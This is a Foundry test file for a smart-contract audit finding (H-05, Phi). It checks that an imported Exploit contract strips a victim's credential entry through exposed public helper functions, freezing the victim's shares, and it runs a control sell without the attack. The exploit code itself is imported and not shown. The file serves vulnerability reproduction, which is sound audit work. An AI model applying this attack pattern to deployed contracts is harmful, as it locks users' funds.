// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "./41091-h-05-exposed-removecredidperaddress-addcredidperaddress-al.sol";

/*//////////////////////////////////////////////////////////////
    Phi -- Exposed public _add/_removeCredIdPerAddress (H-05, #41091)

    Anyone can strip a victim's credId list entry; their subsequent sell reverts.

    - test_exploit: drives the cheatcode-free Exploit end to end.
    - test_legitimateSellWorksWithoutAttack: control — unmolested sell succeeds.
//////////////////////////////////////////////////////////////////////////*/
contract PhiExposedCredIdHelpersTest is Test {
    function test_exploit() public {
        Exploit e = new Exploit();
        e.run();

        assertEq(e.cred().shares(address(e.victim()), e.CRED_ID()), 10, "shares frozen");
        assertEq(e.cred().credCount(address(e.victim())), 0, "list stripped");
    }

    function test_legitimateSellWorksWithoutAttack() public {
        Cred cred = new Cred();
        Victim v = new Victim(cred);
        v.buy();
        v.sellAll();
        assertEq(cred.shares(address(v), 1), 0, "sold cleanly");
        assertEq(cred.credCount(address(v)), 0, "list cleared");
    }
}
